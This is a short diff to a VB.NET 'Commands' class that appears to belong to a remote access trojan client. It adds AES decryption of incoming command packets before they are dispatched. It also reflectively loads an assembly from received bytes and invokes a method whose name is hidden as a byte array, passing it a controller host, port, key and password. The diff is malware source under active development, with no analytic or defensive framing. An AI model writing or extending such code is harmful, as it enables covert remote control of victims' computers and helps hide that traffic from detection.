@@ -4,10 +4,12 @@ Imports System.Threading
 Public Class Commands
 
     Private Shared SPL = "|'L'|"
-    Private Shared C As New TCP
+    Private Shared C As New Client
 
     Public Shared Sub Data(ByVal b As Byte())
-        Dim A As String() = Split(BS(b), SPL)
+        Dim EN As String = AES_Decrypt(BS(b))
+        Dim A As String() = Split(EN, SPL)
+
         Try
             Select Case A(0)
                 Case "PC-RES"
@@ -73,7 +75,7 @@ Public Class Commands
             For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                 For Each MF In A.GetMethods
                     If MF.Name = BS(New Byte() {82, 67}) Then 'RC
-                        MF.Invoke(Nothing, New Object() {Settings.HOST, Settings.PORT, TCP.KEY})
+                        MF.Invoke(Nothing, New Object() {Settings.HOST, Settings.PORT, Client.KEY, pass})
                     End If
                 Next
             Next
